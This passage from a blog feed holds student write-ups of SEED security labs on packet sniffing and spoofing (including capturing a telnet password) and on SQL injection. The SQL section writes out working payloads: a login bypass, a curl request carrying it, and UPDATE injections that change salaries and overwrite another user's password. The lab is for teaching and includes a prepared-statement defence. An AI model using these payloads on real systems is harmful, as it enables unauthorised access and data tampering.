alt=""></p></li></ol><p><strong>劫持TCP会话，并反弹shell成功！</strong></p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 9</title>
    <link href="/2024/12/26/lab9/"/>
    <url>/2024/12/26/lab9/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 9-嗅探与欺骗实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04 (seed-ubuntu)</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是如何在软件中实现的。本实验的目标是让学生掌握大多数嗅探和欺骗工具的基本技术。学生们将使用一些简单的嗅探和欺骗程序，阅读它们的源代码，修改它们，并最终对这些程序的技术方面有深入的了解。在本实验结束时，学生应该能够编写自己的嗅探和欺骗程序。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="环境准备">环境准备</h4><ol><li><p>加载<code>handsonsecurity/seed-ubuntu:large</code>的镜像：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103605356.png" alt=""></p><p>查看一下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103611589.png" alt=""></p></li><li><p>使用以下命令创建并开启docker作为服务器；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose build<br>docker-compose up<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103617277.png" alt=""></p></li></ol><hr><h4 id="Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets">Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</h4><h5 id="Task-1-1-Sniffing-Packets">Task 1.1: Sniffing Packets</h5><h6 id="Task-1-1A">Task 1.1A.</h6><ol><li><p>打开另一终端，创建<code>sniffer.py</code>文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103623041.png" alt=""></p></li><li><p>安装<code>scapy</code>，这里看到已经安装了；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103628287.png" alt=""></p></li><li><p>先把<code>sniffer.py</code>的权限设置一下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103633444.png" alt=""></p></li><li><p>非root下运行<code>sniffer.py</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103639224.png" alt=""></p></li><li><p>root下运行<code>sniffer.py</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103644729.png" alt=""></p><p><strong>可以看到这个终端开始嗅探了</strong></p></li><li><p>另一终端 ping 10.0.2.4</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103649727.png" alt=""></p></li><li><p>发现有返回，且都是ICMP协议的包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103658497.png" alt=""></p><p><strong>说明返回了嗅探的结果</strong></p></li></ol><p><strong>嗅探成功！</strong></p><hr><h6 id="Task-1-1B">Task 1.1B.</h6><ol><li><p>创建<code>sniffer-1.py</code>，使用summary()函数返回pkt</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103704808.png" alt=""></p></li><li><p>运行<code>sniffer-1.py</code>开始嗅探</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103710315.png" alt=""></p></li><li><p>另一终端ping 10.2.0.4</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103715846.png" alt=""></p></li><li><p>嗅探结果返回如下，只捕获了ICMP包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103720576.png" alt=""></p></li></ol><p><strong>嗅探成功！</strong></p><hr><ol><li><p>创建<code>datapak.py</code>，用于从10.0.2.2向10.0.2.1的端口23发送包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103725539.png" alt=""></p><p>修改<code>sniffer-1.py</code>，将ip.src, tcp.dport加进过滤器中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103732978.png" alt=""></p></li><li><p>先开<code>sniffer-1.py</code>进行嗅探</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103737864.png" alt=""></p></li><li><p>运行<code>datapak.py</code>发包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103741964.png" alt=""></p></li><li><p>得到嗅探结果</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103746513.png" alt=""></p></li></ol><p><strong>嗅探成功！</strong></p><hr><ol><li><p>查看一下自己本机的ip和子网掩码：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103752872.png" alt=""></p><p>（除了这些ip不能设置外，其他的都可以）</p></li><li><p>修改<code>datapak.py</code>，改成除了自己所连子网下的ip，比如题目举例的<code>128.230.0.0/16</code>下的ip<code>128.230.0.1</code>，端口仍然设置为23</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104152333.png" alt=""></p></li><li><p>修改<code>sniffer-1.py</code>，将过滤器修改为<code>128.230.0.0/16</code>下的子网</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104158785.png" alt=""></p></li><li><p>先开启嗅探，运行<code>sniffer-1.py</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104204249.png" alt=""></p></li><li><p>运行<code>datapak.py</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104209747.png" alt=""></p></li><li><p>得到嗅探结果：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104215203.png" alt=""></p></li></ol><p><strong>嗅探成功！</strong></p><hr><h5 id="Task-1-2-Spoofing-ICMP-Packets">Task 1.2: Spoofing ICMP Packets</h5><ol><li><p>wireshark已经安装好了，输入<code>wireshark</code>直接启动</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104220549.png" alt=""></p></li><li><p>因为scrapy可以将发出的包的任意字段进行隐藏，所以修改<code>datapak.py</code>中的ip.src，修改为<code>233.233.233.233</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104226921.png" alt=""></p></li><li><p>在wireshark中选择any，监听所有网卡</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104232213.png" alt=""></p></li><li><p>运行<code>datapak.py</code>，发送隐藏了ip的数据包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104237528.png" alt=""></p></li><li><p>wireshark中抓到包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104243515.png" alt=""></p><p>可以看到src.ip, dst.ip, tcp.port都是设定的值，src.ip成功隐藏为<code>233.233.233.233</code></p></li></ol><p><strong>欺骗成功！</strong></p><hr><h5 id="Task-1-3-Traceroute">Task 1.3: Traceroute</h5><ol><li><p>创建<code>trace.py</code>，探究从本机到’<a href="http://baidu.com">baidu.com</a>’需要经过哪些路由</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104249466.png" alt=""></p></li><li><p>运行得到结果</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104254708.png" alt=""></p><p>说明’<a href="http://baidu.com">baidu.com</a>’的ip是<code>110.242.68.66</code>，只需要一跳就到了。</p></li></ol><hr><h5 id="Task-1-4-Sniffing-and-then-Spoofing">Task 1.4: Sniffing and-then Spoofing</h5><ol><li><p>创建<code>sniffer-task14.py</code>，使得嗅探器不仅要抓取当前子网内的所有ICMP数据包，还要针对每一个数据包都去构造<strong>伪响应</strong></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104301137.png" alt=""></p></li><li><p>运行<code>sniffer-task14.py</code>进行嗅探</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104306133.png" alt=""></p></li><li><p>另一终端ping 1.2.3.4，这是互联网中并不存在的ip</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104311495.png" alt=""></p><p>发现不仅嗅探器里显示发送数据包，而且确实能ping通，能收到伪造的回应数据包</p></li><li><p>另一终端ping 10.9.0.99，这是子网中不存在的ip</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104317867.png" alt=""></p><p>发现显示不可达，嗅探器并不返回。</p><p>这是因为在同一子网内，数据包不会经过主机提供的NAT映射服务以转发到外网，而是会顺着局域网内路由直接发送到对方主机，而<code>10.9.0.99</code>又并不存在，因此显示不可达</p></li><li><p>另一终端ping 10.9.0.99，这是互联网中存在的ip</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104323510.png" alt=""></p><p>由于真实的服务器也会返回一个报文，所以容器中会接收到两份返回报文，显示冗余了！</p></li></ol><hr><h4 id="Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets">Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h4><h5 id="Task-2-1-Writing-Packet-Sniffing-Program">Task 2.1: Writing Packet Sniffing Program</h5><ol><li><p>创建<code>sniff.c</code>文件，使用c++进行嗅探，并打印出数据包的src.ip和dst.ip</p><p><font color='orange'>*将main函数中的网卡名称改成自己本地ubuntu的</font><font color='red'>（箭头所指）</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104330213.png" alt=""></p></li><li><p>编译时链接pcap库，得到可执行的嗅探器<code>sniff</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104336884.png" alt=""></p></li><li><p>查看容器，将<code>sniff</code>复制到seed-attacker的tmp文件夹下，并进入到攻击容器中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104342578.png" alt=""></p></li><li><p>attacker主机等待嗅探</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104347883.png" alt=""></p></li><li><p>进入hostA主机，并尝试ping <a href="http://baidu.com">baidu.com</a></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104353568.png" alt=""></p></li><li><p>attacker容器中嗅探到hostA发出的数据包，嗅探器中返回数据包的src.ip和dst.ip</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104359222.png" alt=""></p></li></ol><p><strong>嗅探成功！</strong></p><hr><h6 id="Task-2-1A-Understanding-How-a-Sniffer-Works">Task 2.1A: Understanding How a Sniffer Works</h6><p>根据实验手册回答三个问题</p><p><strong>Question 1.</strong> Please use your own words to describe the sequence of the library calls that are essential for sniffer programs. This is meant to be a summary, not detailed explanation like the one in the tutorial or book.</p><p>**答：**使用pcap库编写嗅探程序时：</p><ul><li>首先<code>pcap_open_live()</code>打开指定网络接口的实时捕获会话；</li><li>然后<code>pcap_compile()</code>将过滤表达式编译成BPF；</li><li><code>pcap_setfilter()</code>应用之前编译好的过滤器，匹配过滤条件的数据包才会被捕获；</li><li><code>pcap_loop()</code>函数会循环捕获数据包，将每个捕获的数据包传递给回调函数；</li><li>最后调用<code>pcap_close()</code>函数关闭pcap句柄，结束数据包捕获。</li></ul><hr><p><strong>Question 2.</strong> Why do you need the root privilege to run a sniffer program? Where does the program fail if it is executed without the root privilege?</p><p>**答：需要root权限。**因为嗅探器直接访问网络接口，捕获经过的所有数据包，这个行为需要root权限才能执行。</p><p>调用<code>pcap_open_live()</code>函数时，若为非root权限，函数会返回NULL，errbuf中填充错误信息，程序将无法继续执行。</p><hr><p><strong>Question 3.</strong> Please turn on and turn off the promiscuous mode in your sniffer program. The value 1 of the third parameter in pcap open live() turns on the promiscuous mode (use 0 to turn it off). Can you demonstrate the difference when this mode is on and off? Please describe how you can demonstrate this. You can use the following command to check whether an interface’s promiscuous mode is on or off (look at the promiscuity’s value).</p><p>**答：**使用混杂模式可以监听所在网段下其他机器的数据包，关闭则不能。</p><p><strong>关闭混杂模式</strong></p><ol><li><p>修改<code>pcap open live()</code>函数的第三个参数为<strong>0</strong>，关闭混杂模式</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104408053.png" alt=""></p></li><li><p>可以看到默认的混杂模式是关闭的</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104414379.png" alt=""></p></li><li><p>编译时链接pcap库，重新得到可执行的嗅探器<code>sniff</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104419505.png" alt=""></p></li><li><p>查看容器，将<code>sniff</code>复制到seed-attacker的tmp文件夹下，并进入到攻击容器中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104424562.png" alt=""></p></li><li><p>attacker主机等待嗅探</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104429530.png" alt=""></p></li><li><p>进入hostA主机，并尝试ping主机B ping 10.9.0.6</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104435274.png" alt=""></p></li><li><p>attacker容器中不能嗅探到hostA发出的数据包，嗅探器中不返回</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104440742.png" alt=""></p></li></ol><p><strong>嗅探失败！</strong></p><hr><p><strong>开启混杂模式</strong></p><ol><li><p>修改<code>pcap open live()</code>函数的第三个参数为<strong>1</strong>，使用混杂模式</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104447041.png" alt=""></p></li><li><p>使用命令开启容器的混杂模式</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104455142.png" alt=""></p></li><li><p>编译时链接pcap库，重新得到可执行的嗅探器<code>sniff</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104500223.png" alt=""></p></li><li><p>将<code>sniff</code>复制到seed-attacker的tmp文件夹下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104505722.png" alt=""></p></li><li><p>attacker主机等待嗅探</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104511430.png" alt=""></p></li><li><p>进入hostA主机，并尝试ping主机B ping 10.9.0.6</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104516695.png" alt=""></p></li><li><p>attacker容器中仍然不能嗅探到hostA ping hostB发出的数据包，ping <a href="http://baidu.com">baidu.com</a> 返回数据包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104522702.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104532177.png" alt=""></p></li></ol><hr><h6 id="Task-2-1B-Writing-Filters">Task 2.1B: Writing Filters.</h6><ol><li><p>修改过滤器，只获得从百度-&gt;本地的数据包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104539001.png" alt=""></p></li><li><p>重复上述过程，发现attacker中的嗅探器只显示了返回的数据包，说明过滤起效了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104545597.png" alt=""></p></li></ol><hr><ol><li><p>修改过滤器，只捕捉目的端口在10到100之间的TCP包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104551364.png" alt=""></p></li><li><p>ping <a href="http://baidu.com">baidu.com</a> 不返回了，说明过滤器起效了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104557148.png" alt=""></p></li></ol><hr><h6 id="Task-2-1C-Sniffing-Passwords">Task 2.1C: Sniffing Passwords.</h6><ol><li><p>创建<code>sniff-2.c</code>文件，尝试嗅探telnet密码，将过滤条件改为tcp，并且将嗅探的网卡改为虚拟网卡</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104605071.png" alt=""></p></li><li><p>将编译后的<code>sniff-2</code>文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104610965.png" alt=""></p></li><li><p>在hostA中尝试使用telnet连接10.9.0.1，可以看到attacker嗅探器中返回有数据</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104616760.png" alt=""></p></li><li><p>hostA继续输入，直到输入password</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104622218.png" alt=""></p><p>attacker嗅探器中仍然可以返回，拿到密码了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104628184.png" alt=""></p><p>可以看到登录的用户为seed，嗅探到的密码为dees</p></li></ol><p><strong>嗅探成功！</strong></p><hr><h5 id="Task-2-2-Spoofing">Task 2.2: Spoofing</h5><h6 id="Task-2-2A-Write-a-spoofing-program">Task 2.2A: Write a spoofing program.</h6><ol><li><p>创建<code>myheader.h</code>，完整见源代码</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104634434.png" alt=""></p></li><li><p>创建<code>checksum.c</code>，完整见源代码</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104640409.png" alt=""></p></li><li><p>创建<code>spoof.c</code>，构造欺骗的包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104645978.png" alt=""></p></li><li><p>创建<code>task22A.c</code>，用于发送欺骗的数据包，完整见源代码</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104651567.png" alt=""></p></li><li><p>编译<code>task22A.c</code>和<code>spoof.c</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104657245.png" alt=""></p></li><li><p>打开wireshark进行抓包，运行<code>task22A</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104702736.png" alt=""></p><p>可以看到伪造的UDP包，其中有虚假的ip等</p></li></ol><p><strong>欺骗成功！</strong></p><hr><h6 id="Task-2-2B-Spoof-an-ICMP-Echo-Request">Task 2.2B: Spoof an ICMP Echo Request.</h6><ol><li><p>创建<code>task22B.c</code>文件，用于伪造ICMP的响应包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104708790.png" alt=""></p></li><li><p>编译得到<code>task22B</code>的可执行文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104714536.png" alt=""></p></li><li><p>打开wireshark进行监听，运行task22B，得到伪造的ICMP响应包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104721086.png" alt=""></p><p>得到从8.8.8.8的响应包，说明伪造成功！</p></li></ol><p><strong>伪造成功！</strong></p><hr><p>回答实验手册中的问题</p><p><strong>Question 4.</strong> Can you set the IP packet length field to an arbitrary value, regardless of how big the actual packet is?</p><p>**答：不可以。**IP数据包的length field为数据包的总长度。如果length field小于实际长度，会导致数据丢失；length field大于实际长度，会造成接收方处理错误。所以必须确保length field准确反映数据包的实际大小。</p><p><strong>Question 5.</strong> Using the raw socket programming, do you have to calculate the checksum for the IP header?</p><p>**答：在使用原始套接字发送IP数据包时，需要计算IP头部的checksum。**因为操作系统不会计算原始套接字的数据包校验和，需要自己手动实现checksum的计算，用于检测header在传输过程中是否出现错误，保证数据完整性。</p><p><strong>Question 6.</strong> Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?</p><p>**答：需要root权限。**因为原始套接字允许直接访问较低层次的协议，可能会被用于发送恶意数据包或进行网络攻击，所以操作系统限制只有root权限才能创建与使用原始套接字。</p><p>当调用<code>socket()</code>函数并指定<code>SOCK_RAW</code>时，如果没有root权限，系统会返回一个错误<code>EACCES</code>，则程序无法继续对数据包进行发送或接收。</p><p>如下图：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104726691.png" alt=""></p><hr><h5 id="Task-2-3-Sniff-and-then-Spoof">Task 2.3: Sniff and then Spoof</h5><ol><li><p>创建<code>task23.c</code>，用于嗅探局域网内发送的ICMP包，并伪造响应，使得目标主机认为该局域网内存在实际不存在的主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104732025.png" alt=""></p></li><li><p>编译得到<code>task23</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104738555.png" alt=""></p></li><li><p>运行<code>task23</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104747635.png" alt=""></p></li><li><p>使用hostA ping一个明显不存在的主机，比如1.1.1.1，但是有返回的ICMP响应包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104756551.png" alt=""></p><p>可以看到hostA中得到了响应的ICMP包，attacker也嗅探到了hostA</p></li></ol><p><strong>伪造成功！</strong></p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 8</title>
    <link href="/2024/12/26/lab8/"/>
    <url>/2024/12/26/lab8/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 8-Sql注入实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04 (seed-ubuntu)</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- SQL注入是一种代码注入技术，它利用web应用程序和数据库服务器之间接口中的漏洞。当用户的输入在发送到后端数据库服务器之前未在web应用程序中正确检查时，就会出现此漏洞。许多web应用程序从用户处获取输入，然后使用这些输入构造SQL查询，这样web应用程序就可以从数据库中获取信息。Web应用程序还使用SQL查询在数据库中存储信息。这些是web应用程序开发中的常见做法。如果未仔细构造SQL查询，则可能会出现SQL注入漏洞。SQL注入攻击是对web应用程序最常见的攻击之一。在本实验室中，我们创建了一个易受SQL注入攻击的web应用程序。我们的web应用程序包含许多web开发人员所犯的常见错误。学生的目标是找到利用SQL注入漏洞的方法，演示攻击可能造成的损害，并掌握有助于抵御此类攻击的技术。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="环境部署">环境部署</h4><ol><li><p>修改<code>image_www/apache_sql_injection.conf</code>文件，将<code>www.seedlabsqlinjection.com</code>的url修改进去</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102947615.png" alt=""></p></li><li><p>创建docker镜像</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102959608.png" alt=""></p><p>镜像创建完成</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103006304.png" alt=""></p></li><li><p>启动容器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103012719.png" alt=""></p></li><li><p>访问<code>www.seedlabsqlinjection.com</code>，得到页面</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103019287.png" alt=""></p></li></ol><hr><h4 id="Task-1-Get-Familiar-with-SQL-Statements">Task 1: Get Familiar with SQL Statements</h4><ol><li><p>作业中给了seedubuntu用户下的User用户表</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103025497.png" alt=""></p></li><li><p>进入docker创建的mysql容器当中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103030132.png" alt=""></p></li><li><p>使用root用户，dees密码进入mysql当中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103035140.png" alt=""></p></li><li><p>看一下mysql的数据库</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103040517.png" alt=""></p><p>果然有作业中写到的sqllab_users数据库</p></li><li><p>看一下sqllab_users数据库的表</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103047078.png" alt=""></p><p>确实得到了作业中所写到的这些字段</p></li><li><p>使用sql语句将Alice的信息筛选出来</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103052888.png" alt=""></p><p>连加密的密码都可以得到</p><p>可以尝试解密一下，得到密码为SHA-1加密，原文为’seedalice’</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103058397.png" alt=""></p></li></ol><hr><h4 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement">Task 2: SQL Injection Attack on SELECT Statement</h4><h5 id="Task-2-1-SQL-Injection-Attack-from-webpage">Task 2.1: SQL Injection Attack from webpage.</h5><ol><li><p>观察<code>image_www/code/unsafe_home.php</code>文件，可以看到home登录时的sql查询语句</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103104432.png" alt=""></p><p>可以直接用’将后面password的校验给过滤掉，再使用#传入password</p></li><li><p>所以在前端输入admin’;#</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103109812.png" alt=""></p><p>成功登入admin账号</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103115397.png" alt=""></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-2-2-SQL-Injection-Attack-from-command-line">Task 2.2: SQL Injection Attack from command line.</h5><ol><li><p>观察登入进去的url</p><p><code>http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27%3B%23&amp;Password=</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103122258.png" alt=""></p></li><li><p>直接使用<code>curl http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27%3B%23&amp;Password=</code>命令，在终端中访问这个url，就能得到页面的内容，其中%27%3B%23即为<code>';#</code>被URL编码过后的结果（%27、%23也是ASCII编码）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103128907.png" alt=""></p><p>尤其表格中的内容：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103136505.png" alt=""></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-2-3-Append-a-new-SQL-statement">Task 2.3: Append a new SQL statement.</h5><ol><li><p>作业中提到想要直接在页面中使用两个sql语句来修改数据库的值</p><p>于是尝试使用admin账号来将Alice的名字改成AAA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">admin&#x27;;update credential set Name=&#x27;AAA&#x27; where Name=&#x27;Alice&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103143966.png" alt=""></p></li><li><p>报错了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103150307.png" alt=""></p></li><li><p>是因为<code>unsafe_home.php</code>文件中的<code>query()</code>函数禁用很多语句</p></li></ol><p><strong>sql注入攻击失败！</strong></p><hr><h4 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement">Task 3: SQL Injection Attack on UPDATE Statement</h4><h5 id="Task-3-1-Modify-your-own-salary">Task 3.1: Modify your own salary.</h5><ol><li><p>alice登录自己的账户</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103156477.png" alt=""></p></li><li><p>使用编辑个人信息的方式进行注入，将工资改成999999</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;,Salary=&#x27;999999<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103203674.png" alt=""></p></li><li><p>修改成功</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103210185.png" alt=""></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-3-2-Modify-other-people’-salary">Task 3.2: Modify other people’ salary.</h5><ol><li><p>输入以下语句进行注入，将Boby的工资设为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;, Salary=1 where Name=&#x27;Boby&#x27;;#<br></code></pre></td></tr></table></figure></li><li><p>前端输入</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103217502.png" alt=""></p></li><li><p>进入admin，发现确实更改了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103223550.png" alt=""></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-3-3-Modify-other-people’-password">Task 3.3: Modify other people’ password.</h5><ol><li><p>前面用反查发现加密是用的SHA-1进行加密的，如果想更改Boby密码为自己知道的，比如<code>aliceknows</code>，先去加密一下（得到<code>914a6faa2497ebdd583e0b046c587f87af6561c0</code>）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103231898.png" alt=""></p></li><li><p>然后注入以下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;,Password=&#x27;914a6faa2497ebdd583e0b046c587f87af6561c0&#x27; where Name=&#x27;Boby&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103237510.png" alt=""></p></li><li><p>登录Boby，使用密码<code>aliceknows</code>，成功登录</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103243834.png" alt=""></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h4 id="Task-4-Countermeasure-—-Prepared-Statement">Task 4: Countermeasure — Prepared Statement</h4><ol><li><p>这项任务是需要创建出<code>safe_home.php</code>，将sql语句与数据分离，防止SQL注入攻击</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103250146.png" alt=""></p></li><li><p>首先复制<code>unsafe_home.php</code>文件，存为<code>safe_home.php</code>文件</p><p>修改上一点中的语句，改为将sql参数与查询分离的语句</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103256017.png" alt=""></p></li><li><p>将<code>index.html</code>中指向的<code>unsafe_home.php</code>，改为<code>safe_home.php</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103303037.png" alt=""></p></li><li><p>重新启动容器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103309313.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103314367.png" alt=""></p></li><li><p>再次尝试直接登录admin用户</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103319227.png" 